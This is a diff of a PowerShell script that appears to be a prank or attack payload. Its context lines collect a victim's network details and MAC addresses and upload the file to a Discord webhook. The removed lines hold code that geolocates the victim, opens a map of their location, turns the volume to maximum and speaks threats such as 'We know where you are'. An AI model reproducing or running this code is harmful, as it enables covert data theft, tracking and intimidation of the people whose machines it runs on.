@@ -58,30 +58,6 @@ $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Sta
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
-
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
-
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
-		
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
-}
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $output = @"
@@ -140,15 +116,6 @@ $localIP
 MAC:
 $MAC
 
-$GL = Get-GeoLocation
-
-$GL = $GL -split " "
-
-$Lat = $GL[0].Substring(11) -replace ".$"
-
-$Lon = $GL[1].Substring(10) -replace ".$"
-
-$output > $FileName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -179,30 +146,6 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
-Pause-Script
-
-# Opens their browser with a map of their current location
-
-Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
-
-Start-Sleep -s 3
-
-# Sets Volume to max level
-
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
-
-# Sets up speech module 
-
-$s=New-Object -ComObject SAPI.SpVoice
-$s.Rate = -2
-$s.Speak("We found you $FN")
-$s.Speak("We know where you are")
-$s.Speak("We are everywhere")
-$s.Speak("Expect us")
-
-
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 <#
 
